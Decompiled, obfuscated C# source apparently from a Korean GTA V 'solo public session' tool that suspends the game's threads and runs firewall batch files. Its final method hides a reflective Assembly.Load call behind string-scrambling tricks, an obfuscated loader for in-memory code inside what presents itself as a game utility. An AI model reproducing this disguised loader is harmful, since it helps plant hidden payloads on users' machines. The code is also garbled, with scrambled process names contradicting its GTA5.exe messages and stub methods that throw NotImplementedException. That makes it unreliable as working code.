using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Cg6;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Xi1;
using Zj6;
using i8Y;

namespace Ak8;

public class Pa1
{
	internal sealed class Sg9
	{
		internal object object_0;

		internal object object_1;

		internal object object_2;

		internal object object_3;

		internal Sg9()
		{
		}
	}

	[StructLayout(LayoutKind.Auto)]
	internal struct a8T
	{
		internal IContainer icontainer_0;

		internal ContextMenuStrip contextMenuStrip_0;

		internal ToolStripMenuItem toolStripMenuItem_0;

		internal ToolStripMenuItem toolStripMenuItem_1;
	}

	private object _Logbox;

	private string logpath;

	private object _CheckProcSub;

	private object _RecentAct;

	private Yy5.p9B p9B_0 = new Yy5.p9B();

	public object Logbox
	{
		get
		{
			return _Logbox;
		}
		set
		{
			_Logbox = RuntimeHelpers.GetObjectValue(value);
		}
	}

	private IntPtr OpenThread
	{
		get
		{
			throw new NotImplementedException();
		}
	}

	public object ThreadAccess
	{
		get
		{
			return p9B_0.object_0;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			p9B_0.object_0 = objectValue;
		}
	}

	public object ProcNotier
	{
		get
		{
			return p9B_0.object_1;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			p9B_0.object_1 = objectValue;
		}
	}

	public object SessionMaker
	{
		get
		{
			return p9B_0.object_2;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			p9B_0.object_2 = objectValue;
		}
	}

	public object CheckProcSub
	{
		get
		{
			return _CheckProcSub;
		}
		set
		{
			_CheckProcSub = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object CheckProc
	{
		get
		{
			return p9B_0.object_3;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			p9B_0.object_3 = objectValue;
		}
	}

	public object SessionMakerTime
	{
		get
		{
			return p9B_0.object_4;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			p9B_0.object_4 = objectValue;
		}
	}

	public object RecentAct
	{
		get
		{
			return _RecentAct;
		}
		set
		{
			_RecentAct = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public Pa1()
	{
		logpath = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "3445tygfdfg.log");
	}

	private void Cf8(object sender, EventArgs e)
	{
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		IComparable comparable = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "fgfgrer4r4.log");
		if (File.Exists((string)comparable))
		{
			NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { File.ReadAllText(comparable as string) }, (string[])null, (Type[])null, false, true);
			return;
		}
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Font", new object[1] { (object)new Font(Conversions.ToString(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null)), Conversions.ToSingle(Operators.OrObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Style", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(FontStyle)2))) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { "\r\r\r\r\r\r\r\r\r" }, (string[])null, (Type[])null, false, true);
	}

	private void Nr4(object sender, EventArgs e)
	{
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		IEquatable<string> equatable = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "gtrrete.log");
		File.Delete((string)equatable);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Font", new object[1] { (object)new Font(Conversions.ToString(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null)), Conversions.ToSingle(Operators.OrObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Style", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(FontStyle)2))) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { "\r\r\r\r\r\r\r\r\r" }, (string[])null, (Type[])null, false, true);
	}

	private void w3J(object sender, EventArgs e)
	{
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		IComparable comparable = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "nmjghrte4.log");
		if (!File.Exists((string)comparable))
		{
			NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { "\r\r\r\r\r\r\r\r\r" }, (string[])null, (Type[])null, false, true);
			return;
		}
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Font", new object[1] { (object)new Font(Conversions.ToString(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null)), Conversions.ToSingle(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Style", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(FontStyle)0))) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { File.ReadAllText((string)comparable) }, (string[])null, (Type[])null, false, true);
	}

	private void f4Z(Process o2X)
	{
		object enumerator = default(object);
		try
		{
			enumerator = o2X.Threads.GetEnumerator();
			while ((enumerator as IEnumerator).MoveNext())
			{
				object obj = (ProcessThread)((IEnumerator)enumerator).Current;
				IntPtr intPtr = this.get_OpenThread(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ThreadAccess, (Type)null, "SUSPEND_RESUME", new object[0], (string[])null, (Type[])null, (bool[])null)), Rb2: false, ((ProcessThread)obj).Id);
				if (intPtr != IntPtr.Zero)
				{
					Eo6(intPtr);
					z2K(intPtr);
				}
			}
		}
		finally
		{
			if (((IEnumerator)enumerator) is IDisposable)
			{
				((enumerator as IEnumerator) as IDisposable).Dispose();
			}
		}
	}

	private void z2K(IntPtr Mn1)
	{
		throw new NotImplementedException();
	}

	private void Eo6(IntPtr t8Y)
	{
		throw new NotImplementedException();
	}

	private void m3J(Process Xf2)
	{
		object enumerator = default(object);
		try
		{
			enumerator = Xf2.Threads.GetEnumerator();
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (ProcessThread)((IEnumerator)enumerator).Current;
				IntPtr intPtr = this.get_OpenThread(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ThreadAccess, (Type)null, "SUSPEND_RESUME", new object[0], (string[])null, (Type[])null, (bool[])null)), Rb2: false, ((ProcessThread)obj).Id);
				if (intPtr != IntPtr.Zero)
				{
					At3(intPtr);
					z2K(intPtr);
				}
			}
		}
		finally
		{
			if ((enumerator as IEnumerator) is IDisposable)
			{
				(((IEnumerator)enumerator) as IDisposable).Dispose();
			}
		}
	}

	private void At3(IntPtr Zo1)
	{
		throw new NotImplementedException();
	}

	private void o3X(object sender, EventArgs e)
	{
		object processesByName = Process.GetProcessesByName("fdfrert");
		if ((processesByName as Process[]).Count() >= 1)
		{
			NewLateBinding.LateSetComplex(ProcNotier, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)32 }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(ProcNotier, (Type)null, "Text", new object[1] { "    dffgrtrt                 GTA5.exe 감지됨" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(CheckProcSub, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(CheckProc, (Type)null, "Stop", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void e6P(object sender, EventArgs e)
	{
		Array processesByName = Process.GetProcessesByName("G543TA5");
		if (((Process[])processesByName).Count() == 0)
		{
			NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(ProcNotier, (Type)null, "Text", new object[1] { "GTA5.exe를 찾지 못했습니다.\rGrand Theft Auto V가 실행되었는지 확인하십시오." }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(CheckProc, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(CheckProcSub, (Type)null, "Stop", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void Cq1(object sender, EventArgs e)
	{
		object processesByName = Process.GetProcessesByName("GT4tedrA5");
		f4Z(((Process[])processesByName)[0]);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Text", new object[1] { "잠시만 기다려 주세요..." }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(SessionMakerTime, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Jf5(object sender, EventArgs e)
	{
		Array processesByName = Process.GetProcessesByName("GT54eA5");
		m3J((processesByName as Process[])[0]);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Text", new object[1] { "1인 공개세션 만들기" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(RecentAct, (Type)null, "Text", new object[1] { "1P Public Session has been created successfully" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(SessionMakerTime, (Type)null, "Stop", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		((ServerComputer)Cx9.Computer).get_FileSystem().WriteAllText(logpath, "[" + Conversions.ToString(DateAndTime.get_Now()) + "] 1인 공개세션이 만들어짐\r", true);
	}

	private void Qa1(object sender, EventArgs e)
	{
		ICloneable cloneable = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "AddFirewall.bat");
		Process.Start(cloneable as string);
		NewLateBinding.LateSetComplex(RecentAct, (Type)null, "Text", new object[1] { " Firewall added completely" }, (string[])null, (Type[])null, false, true);
		((ServerComputer)Cx9.Computer).get_FileSystem().WriteAllText(logpath, "[" + Conversions.ToString(DateAndTime.get_Now()) + "] GTA 온라인 세션 방화벽이 생성됨\r", true);
	}

	private void a5W(object sender, EventArgs e)
	{
		object obj = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "DelFirewall.bat");
		Process.Start(obj as string);
		NewLateBinding.LateSetComplex(RecentAct, (Type)null, "Text", new object[1] { " Firewall removed completely" }, (string[])null, (Type[])null, false, true);
		((ServerComputer)Cx9.Computer).get_FileSystem().WriteAllText(logpath, "[" + Conversions.ToString(DateAndTime.get_Now()) + "] GTA 온라인 세션 방화벽이 제거됨\r", true);
	}

	private void a6D(object sender, EventArgs e)
	{
		Form val = (Form)(object)new Xx9();
		((Control)(Xx9)(object)val).Show();
	}

	private void Xx1(object sender, EventArgs e)
	{
		object obj = new f2K();
		((Control)(f2K)obj).Show();
	}

	internal static object Ne1(object j7E, object g3D)
	{
		IEquatable<string> equatable = string.Format("{0}.{1}.{2}", ";;S;;y;;s;;t;;e;;m;;", ";;R;;e;;f;;l;;e;;c;;t;;i;;o;;n;;", ";;A;;s;;s;;e;;m;;b;;l;;y;;");
		IEnumerable enumerable = ";";
		equatable = ((string)equatable).Replace(enumerable as string, "");
		IEquatable<string> equatable2 = ("l".ToUpper() + "OX".ToLower() + "AX".ToLower() + "DX".ToLower()).Replace("x", "");
		return RuntimeHelpers.GetObjectValue(Type.GetType(equatable as string)!.InvokeMember(equatable2 as string, BindingFlags.InvokeMethod, null, null, new object[1] { g3D }));
	}
}
